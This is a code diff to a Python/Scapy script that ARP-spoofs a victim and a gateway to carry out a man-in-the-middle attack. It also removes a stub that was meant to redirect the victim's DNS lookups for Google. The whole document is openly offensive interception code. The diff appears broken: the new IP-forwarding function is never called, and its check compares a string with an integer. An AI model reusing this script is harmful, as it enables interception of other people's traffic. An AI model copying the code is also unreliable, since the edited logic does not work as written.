@@ -12,7 +12,16 @@ except KeyboardInterrupt:
     print("[*] Exiting...")
     sys.exit(1)
 print("[*] Enabling IP Forwarding...\n")
-os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
+def _enable_linux_iproute():
+
+    file_path = "/proc/sys/net/ipv4/ip_forward"
+    with open(file_path) as f:
+        if f.read() == 1:
+            # already enabled
+            return
+    with open(file_path, "w") as f:
+        print(1, file=f)
 
 def get_mac(IP):
     conf.verb = 0
@@ -32,7 +41,6 @@ def reARP():
     send(ARP(op=2, psrc=gatewayIP, pdst=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMAC), count=7)
     send(ARP(op=2, psrc=victimIP, pdst=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=7)
     print("[*] Disabling IP Forwarding...")
-    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
     print("[*] Shutting Down...")
     sys.exit(1)
 
@@ -44,14 +52,12 @@ def mitm():
     try:
         victimMAC = get_mac(victimIP)
     except Exception:
-        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
         print("[!] Couldn't Find Victim MAC Address")
         print("[!] Exiting...")
         sys.exit(1)
     try: 
         gatewayMAC = get_mac(gatewayIP)
     except Exception:
-        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
         print("[!] Couldn't Find Gateway MAC Address")
         print("[!] Exiting...")
         sys.exit(1)
@@ -64,11 +70,5 @@ def mitm():
             reARP()
             break
 
-def dnsredirect(pkt):
-    if pkt.haslayer(DNSRR):
-        qname = pkt.getlayer(DNSQR).qname
-        if "www.google.com" in qname:
-            print("[*] Target Attempting To Access Google")
-            redirect = IP("www.millesima.fr")
 
 mitm()
